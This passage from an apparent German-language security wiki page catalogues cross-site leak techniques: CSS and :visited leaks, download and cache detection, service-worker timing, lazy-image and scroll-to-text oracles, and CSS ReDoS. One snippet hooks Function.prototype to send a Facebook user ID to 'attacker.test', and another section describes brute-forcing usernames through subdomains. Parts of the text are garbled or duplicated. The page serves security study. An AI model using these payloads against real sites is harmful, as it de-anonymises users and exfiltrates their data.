- **Code Example**: [https://xsinator.com/testing.html#CSS%20Property%20Leak](https://xsinator.com/testing.html#CSS%20Property%20Leak)

Webanwendungen ändern möglicherweise die w**ebsite styling depending on the status of the use**. Cross-origin CSS-Dateien können auf der Angreiferseite mit dem HTML `link`-Element eingebunden werden, und die Regeln werden auf der Angreiferseite angewendet. Wenn eine Seite diese Regeln dynamisch ändert, kann ein Angreifer die Unterschiede erkennen.\
Als Leak-Technik kann der Angreifer `window.getComputedStyle` verwenden, um CSS-Eigenschaften eines bestimmten HTML-Elements auszulesen. Ist das betroffene Element und der Eigenschaftsname bekannt, kann ein Angreifer beliebige CSS-Eigenschaften lesen.

### CSS History

- **Inclusion Methods**: HTML Elements
- **Detectable Difference**: Page Content
- **More info**: [https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history](https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history)
- **Summary:** Detect if the `:visited` style is applied to an URL indicating it was already visited
- **Code Example**: [http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html)

> [!TIP]
> According to [**this**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/), this is not working in headless Chrome.

Der CSS-Selector `:visited` wird verwendet, um URLs anders zu stylen, wenn sie vom Benutzer bereits besucht wurden. Früher konnte `getComputedStyle()` genutzt werden, um diese Stilunterschiede zu erkennen. Moderne Browser verhindern jedoch, dass diese Methode den Link-Zustand offenlegt: sie geben immer die berechnete Style zurück, als wäre der Link besucht, und beschränken die mit `:visited` anwendbaren Styles.

Trotz dieser Beschränkungen lässt sich der Besuchszustand indirekt ermitteln. Eine Technik besteht darin, den Benutzer dazu zu bringen, mit einem von CSS betroffenen Bereich zu interagieren — z. B. durch Nutzung von `mix-blend-mode`. Dieses Property kann Elemente mit dem Hintergrund mischen und so den Besuchszustand bei Benutzerinteraktion sichtbar machen.

Erkennung ist auch ohne Benutzerinteraktion möglich, indem man auf Render-Zeiten von Links abzielt. Browser rendern besuchte und unbesuchte Links unterschiedlich, was messbare Zeitunterschiede erzeugen kann. Ein PoC in einem Chromium-Bug zeigt, wie mehrere Links verwendet werden können, um den Timing-Unterschied zu verstärken und so den Besuchszustand per Timing-Analyse zu erkennen.

Weitere Informationen:
- `:visited`: [MDN Documentation](https://developer.mozilla.org/en-US/docs/Web/CSS/:visited)
- `getComputedStyle()`: [MDN Documentation](https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle)
- `mix-blend-mode`: [MDN Documentation](https://developer.mozilla.org/en-US/docs/Web/CSS/mix-blend-mode)

### ContentDocument X-Frame Leak

- **Inclusion Methods**: Frames
- **Detectable Difference**: Headers
- **More info**: [https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf](https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf)
- **Summary:** In Google Chrome, a dedicated error page is displayed when a page is blocked from being embedded on a cross-origin site due to X-Frame-Options restrictions.
- **Code Example**: [https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak](https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak)

In Chrome wird beim Einbetten einer Seite, die den Header `X-Frame-Options` auf "deny" oder "same-origin" gesetzt hat, eine Fehlerseite angezeigt. Chrome liefert in diesem Fall für das `contentDocument`-Property des eingebetteten Objekts ein leeres Dokumentobjekt (anstatt `null`), im Gegensatz zu iframes oder anderen Browsern. Angreifer konnten dies nutzen, indem sie das leere Dokument detektierten, was Informationen über den Zustand des Benutzers offenbaren kann — insbesondere wenn Entwickler Header inkonsistent setzen und Fehlerseiten übersehen. Konsistente Anwendung von Sicherheitsheadern ist wichtig, um solche leaks zu vermeiden.

### Download Detection

- **Inclusion Methods**: Frames, Pop-ups
- **Detectable Difference**: Headers
- **More info**: [https://xsleaks.dev/docs/attacks/navigations/#download-trigger](https://xsleaks.dev/docs/attacks/navigations/#download-trigger)
- **Summary:** An attacker can discern file downloads by leveraging iframes; continued accessibility of the iframe implies successful file download.
- **Code Example**: [https://xsleaks.dev/docs/attacks/navigations/#download-bar](https://xsleaks.dev/docs/attacks/navigations/#download-bar)

Der Header `Content-Disposition`, speziell `Content-Disposition: attachment`, veranlasst den Browser, Inhalte herunterzuladen statt sie inline anzuzeigen. Dieses Verhalten kann ausgenutzt werden, um zu erkennen, ob ein Benutzer Zugriff auf eine Seite hat, die einen Dateidownload auslöst. In Chromium-basierten Browsern gibt es mehrere Techniken, dieses Download-Verhalten zu erkennen:

1. Download-Bar-Überwachung:
- Beim Herunterladen einer Datei erscheint in Chromium-basierten Browsern eine Download-Bar am unteren Rand.
- Durch Überwachen von Änderungen an der Fensterhöhe können Angreifer das Auftauchen der Download-Bar erkennen und daraus schließen, dass ein Download gestartet wurde.
2. Download-Navigation mit Iframes:
- Löst eine Seite einen Dateidownload über `Content-Disposition: attachment` aus, verursacht das keine Navigation.
- Lädt man den Inhalt in ein iframe und überwacht Navigationsereignisse, lässt sich feststellen, ob ein Download statt Anzeige stattfand (keine Navigation).
3. Download-Navigation ohne Iframes:
- Ähnlich der iframe-Technik, jedoch mit `window.open`.
- Durch Überwachen der Navigation im neu geöffneten Fenster kann man erkennen, ob ein Download ausgelöst wurde (keine Navigation) oder der Inhalt inline angezeigt wird (Navigation).

Wenn nur angemeldete Benutzer solche Downloads auslösen können, erlauben diese Techniken ein indirektes Ermitteln des Authentifizierungsstatus anhand der Browserreaktion auf die Download-Anfrage.

### Partitioned HTTP Cache Bypass <a href="#partitioned-http-cache-bypass" id="partitioned-http-cache-bypass"></a>

- **Inclusion Methods**: Pop-ups
- **Detectable Difference**: Timing
- **More info**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass)
- **Summary:** An attacker can discern file downloads by leveraging iframes; continued accessibility of the iframe implies successful file download.
- **Code Example**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass), [https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722](https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722) (from [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

> [!WARNING]
> This is why this technique is interesting: Chrome now has **cache partitioning**, and the cache key of the newly opened page is: `(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m =xxx)`, but if I open an ngrok page and use fetch in it, the cache key will be: `(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)`, the **cache key is different**, so the cache cannot be shared. You can find more detail here: [Gaining security and privacy by partitioning the cache](https://developer.chrome.com/blog/http-cache-partitioning/)\
> (Comment from [**here**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

Wenn eine Site `example.com` eine Ressource von `*.example.com/resource` einbindet, erhält diese Ressource denselben Cache-Key wie bei einer direkten Top-Level-Navigation. Der Cache-Key besteht aus dem top-level eTLD+1 und dem frame eTLD+1.

Da der Zugriff auf den Cache schneller ist als das Nachladen einer Ressource, kann man versuchen, die Location einer Seite zu ändern und die Navigation z. B. nach 20 ms abzubrechen. Wird die Origin nach dem Abbruch verändert, bedeutet das, dass die Ressource im Cache war.\
Alternativ kann man auch einfach ein `fetch` zur potenziell gecachten Seite senden und die benötigte Zeit messen.

### Manual Redirect <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

- **Inclusion Methods**: Fetch API
- **Detectable Difference**: Redirects
- **More info**: [ttps://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7_0_1234](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7_0_1234)
- **Summary:** It's possible to find out if a response to a fetch request is a redirect
- **Code Example**:

![](<../../images/image (769).png>)

### Fetch with AbortController <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

- **Inclusion Methods**: Fetch API
- **Detectable Difference**: Timing
- **More info**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)
- **Summary:** It's possible to try to load a resource and about before it's loaded the loading is interrupted. Depending on if an error is triggered, the resource was or wasn't cached.
- **Code Example**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)

Verwende _**fetch**_ und _**setTimeout**_ mit einem **AbortController**, um sowohl zu erkennen, ob eine **Ressource gecached** ist, als auch um eine spezifische Ressource aus dem Browser-Cache zu evicten. Dieser Vorgang kann zudem ohne das Cachen neuer Inhalte stattfinden.

### Script Pollution

- **Inclusion Methods**: HTML Elements (script)
- **Detectable Difference**: Page Content
- **More info**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)
- **Summary:** It's possible to **overwrite built-in functions** and read their arguments which even from **cross-origin script** (which cannot be read directly), this might **leak valuable information**.
- **Code Example**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)

#### Prototype hooks to exfiltrate module-scoped data

Pre-define `Function.prototype.default` and `Function.prototype.__esModule = 1` before loading a module so its `default` export calls your hook (e.g., receives `{userID: ...}`), letting you read module-scoped values without timing or brute force.
```html
<script>
Function.prototype.default=(e)=>{if(typeof e.userID==="string")fetch("//attacker.test/?id="+e.userID)}
Function.prototype.__esModule=1
</script>
<script src="https://www.facebook.com/signals/iwl.js?pixel_id=PIXEL_ID"></script>
```
Die Anfrage selbst wird ebenfalls zu einem login-state oracle, wenn das Skript nur für authentifizierte Nutzer geladen wird.

### Service Workers <a href="#service-workers" id="service-workers"></a>

- **Inclusion Methods**: Pop-ups
- **Detectable Difference**: Page Content
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers)
- **Summary:** Messen der Ausführungszeit einer Website mithilfe von service workers.
- **Code Example**:

In dem beschriebenen Szenario initiiert der Angreifer das Registrieren eines **service worker** auf einer seiner Domains, beispielsweise "attacker.com". Anschließend öffnet der Angreifer im Hauptdokument ein neues Fenster auf der Ziel-Website und weist den **service worker** an, einen Timer zu starten. Während das neue Fenster zu laden beginnt, navigiert der Angreifer die zuvor erhaltene Referenz zu einer Seite, die vom **service worker** verwaltet wird.

Bei Eintreffen der in dem vorherigen Schritt initiierten Anfrage antwortet der **service worker** mit dem Statuscode **204 (No Content)** und bricht damit effektiv die Navigation ab. Zu diesem Zeitpunkt nimmt der **service worker** eine Messung des zuvor gestarteten Timers vor. Diese Messung wird durch die Laufzeit von JavaScript beeinflusst, die Verzögerungen im Navigationsprozess verursacht.

> [!WARNING]
> Bei einem Execution-Timing ist es möglich, **Netzwerkfaktoren zu eliminieren**, um **präzisere Messungen** zu erhalten. Zum Beispiel durch vorheriges Laden der Ressourcen, die die Seite verwendet.

### Fetch Timing

- **Inclusion Methods**: Fetch API
- **Detectable Difference**: Timing (generally due to Page Content, Status Code)
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)
- **Summary:** Verwende [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow), um die Zeit zu messen, die eine Anfrage benötigt. Auch andere Clocks sind möglich.
- **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)

### Cross-Window Timing

- **Inclusion Methods**: Pop-ups
- **Detectable Difference**: Timing (generally due to Page Content, Status Code)
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)
- **Summary:** Verwende [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow), um die Zeit zu messen, die eine Anfrage mittels `window.open` benötigt. Auch andere Clocks sind möglich.
- **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)

### Subdomain probing for identity/login state

- **Inclusion Methods**: HTML Elements (script), Frames
- **Detectable Difference**: DNS/HTTP load success, CORB/header changes
- **Summary:** Wenn Identifier in Subdomain-Labels leben (z. B. `www.<username>.sb.facebook.com`), fordere Ressourcen auf Kandidaten-Hosts an und interpretiere `onload` vs `onerror`/Timeouts als Boolean. Kombiniere das mit login-only scripts (z. B. `/signals/iwl.js`), um Benutzernamen per brute-force zu erraten und die Authentifizierung zu zugehörigen Properties zu verifizieren.
- **Note:** Signals können durch verschiedene Inclusion-Typen (`script`, `iframe`, `object`) verstärkt werden, um `X-Frame-Options`, `CORB` oder Redirect-Unterschiede pro Kandidat zu erkennen.

## With HTML or Re Injection

Hier finden Sie Techniken, um Informationen aus cross-origin HTML zu exfiltrieren, indem HTML-Inhalt injiziert wird. Diese Techniken sind interessant für Fälle, in denen Sie aus irgendeinem Grund HTML injizieren können, aber kein JS-Code injiziert werden kann.

### Dangling Markup


{{#ref}}
../dangling-markup-html-scriptless-injection/
{{#endref}}

### Image Lazy Loading

Wenn Sie **content exfiltrieren** müssen und HTML unmittelbar vor dem Secret hinzufügen können, sollten Sie die **common dangling markup techniques** prüfen.\
Falls Sie aus welchem Grund auch immer **MUST** zeichenweise vorgehen müssen (z. B. weil die Kommunikation über einen Cache-Hit erfolgt), können Sie diesen Trick verwenden.

**Images** in HTML haben ein "**loading**"-Attribut, dessen Wert "**lazy**" sein kann. In diesem Fall wird das Bild geladen, wenn es angezeigt wird, und nicht während des Seitenladens:
```html
<img src=/something loading=lazy >
```
Daher kannst du **viele Junk-Zeichen hinzufügen** (zum Beispiel **Tausende von "W"**) um **die Webseite vor dem Secret zu füllen oder etwas wie** `<br><canvas height="1850px"></canvas><br>`.\
Dann, wenn zum Beispiel unsere **injection** vor dem **flag** erscheint, würde das **image** geladen werden, erscheint sie jedoch **nach** dem **flag**, verhindern das flag + der Junk, dass es geladen wird (du musst mit der Menge an Junk experimentieren). This is what happened in [**this writeup**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/).

Another option would be to use the **scroll-to-text-fragment** if allowed:

#### Scroll-to-text-fragment

Allerdings lässt du den **bot** die Seite mit etwas wie
```
#:~:text=SECR
```
Die Webseite könnte in etwa so aussehen: **`https://victim.com/post.html#:~:text=SECR`**

Dabei enthält post.html die vom Angreifer eingefügten Junk-Zeichen und ein lazy load image, und anschließend wird das Secret des Bots hinzugefügt.

Dieser Text sorgt dafür, dass der Bot jeden Text auf der Seite anspricht, der `SECR` enthält. Da dieser Text das Secret ist und sich direkt **unter dem Bild** befindet, wird das **Bild nur geladen, wenn das erratene Secret korrekt ist**. Damit hast du dein oracle, um das Secret **char by char** zu exfiltrieren.

Ein Beispielcode, um das auszunutzen: [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)

### Image Lazy Loading Time Based

Wenn es **nicht möglich ist, ein externes Bild zu laden**, das dem Angreifer anzeigen könnte, dass das Bild geladen wurde, wäre eine andere Option, den Buchstaben mehrmals zu **erraten und das zu messen**. Wenn das Bild geladen wird, dauern alle Requests länger als wenn das Bild nicht geladen wird. Genau das wurde in der [**solution of this writeup**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) **hier zusammengefasst:**

{{#ref}}
event-loop-blocking-+-lazy-images.md
{{#endref}}

### ReDoS


{{#ref}}
../regular-expression-denial-of-service-redos.md
{{#endref}}

### CSS ReDoS

Wenn `jQuery(location.hash)` verwendet wird, ist es möglich per Timing i**ob HTML-Inhalt vorhanden ist**, das liegt daran, weil wenn der Selektor `main[id='site-main']` nicht matcht, muss er den Rest der **selectors** nicht prüfen:
```javascript
$(
"*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']"
)
```
### CSS Injection


{{#ref}}
css-injection/
{{#endref}}

## Gegenmaßnahmen

Es gibt Gegenmaßnahmen, die in [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) empfohlen werden, sowie in jedem Abschnitt des Wikis [https://xsleaks.dev/](https://xsleaks.dev/). Schau dort nach, um mehr Informationen darüber zu erhalten, wie man sich gegen diese Techniken schützt.

## Referenzen

- [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)
- [https://xsleaks.dev/](https://xsleaks.dev)
- [https://github.com/xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)
- [https://xsinator.com/](https://xsinator.com/)
- [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)
- [Cross-Site Leaks (XS-Leaks) across Meta platforms](https://ysamm.com/uncategorized/2026/01/16/cross-site-leaks.html)

{{#include ../../banners/hacktricks-training.md}}
